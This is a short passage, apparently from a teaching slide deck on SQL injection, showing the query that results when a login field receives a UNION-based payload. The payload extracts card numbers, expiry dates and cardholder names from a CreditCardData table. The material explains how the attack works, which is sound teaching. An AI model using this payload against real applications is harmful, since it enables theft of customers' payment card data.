@@ -1,0 +1,14 @@
+By:
+.com
+presentationgo.com
+© presentationgo.com
+SQL Injection (IX) Example 3:
+Now let’s examine the actual query that is executed when the application
+runs:
+• SELECT [UserName] FROM dbo.[Login] WHERE [Username] = '' AND
+[Password]=''
+• UNION SELECT SUBSTRING((SELECT ',' + s.[CardNumber] + ';' + s.[Expiry] +
+';' + s.[Name]
+• FROM dbo.[CreditCardData] s FOR XML PATH('')),2,200000)--’
+• Since this is an SQL UNION statement, it combines the result of both
+queries.
